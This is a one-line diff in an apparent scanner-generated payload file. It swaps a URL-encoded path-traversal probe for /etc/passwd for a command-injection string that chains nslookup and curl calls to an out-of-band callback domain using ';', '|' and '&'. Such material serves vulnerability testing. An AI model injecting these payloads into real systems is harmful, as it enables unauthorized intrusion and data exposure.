@@ -1,1 +1,1 @@
-%2fetc%2fpasswd
+;(nslookup -q=cname hitslvhkzawpaffa57.bxss.me||curl hitslvhkzawpaffa57.bxss.me)|(nslookup -q=cname hitslvhkzawpaffa57.bxss.me||curl hitslvhkzawpaffa57.bxss.me)&(nslookup -q=cname hitslvhkzawpaffa57.bxss.me||curl hitslvhkzawpaffa57.bxss.me)
